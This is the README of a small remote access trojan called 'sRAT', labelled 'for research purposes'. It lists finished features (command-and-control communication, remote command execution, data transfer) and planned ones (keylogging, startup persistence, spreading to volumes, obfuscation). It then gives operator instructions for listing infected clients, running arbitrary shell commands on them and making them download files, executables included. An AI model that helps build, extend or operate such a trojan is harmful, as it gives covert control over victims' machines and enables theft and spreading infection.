# sRAT

A small remote access trojan, for research purposes.

## todo list

1. DONE: communication
    1. DONE: server host
    2. DONE: request syntax
2. features
    1. DONE: command exec
    2. DONE: data transfer
    3. *key logging*
3. infection
    1. startup
    2. copy on volumes
4. sneak
    1. obfuscation
    2. encryption

## git usage

Always use **branches** when implementing a *feature* or a *fix*, with syntax `yourName/feature/featureName` or `yourName/fix/bugToFix`, and be careful when merging.

## server usage

You may insert commands after the `>` prompt. At any time, you can list commands typing `help`.

### select client

To display all connected clients, use

	>list

It will output a two-column array, with ids and MACs of all connected clients. To selet a client, use `select ID`. For example,

	>list
	id     MAC address
	1234   AA-BB-CC-DD-EE-FF
	5678   00-11-22-33-44-55
	>select 1234
	Selected client 1234

Now the prompt should begin as follows:

	1234>

### execute a command

When a client is selected, make it execute a command with `exec YOUR_COMMAND`.

	1234>exec ipconfig
	Added command to stack

It might take up to 10 seconds to be sent to the client, and then, the output will show off. If client is using Windows, you can start any shell command with

	1234>exec cmd.exe /C YOUR_COMMAND

The output will be sent back to you.

### download a file

When a client is select, make it download a file with `dwnld FILE_URL LOCAL_FILENAME`.

	1234>dwnld https://i.imgur.com/v4kJFU3.gif test.gif

If you want to send a local file, you can use

	1234>dwnld file:\\\C:\\Users\\FOO\\Desktop\\spam.exe out.exe
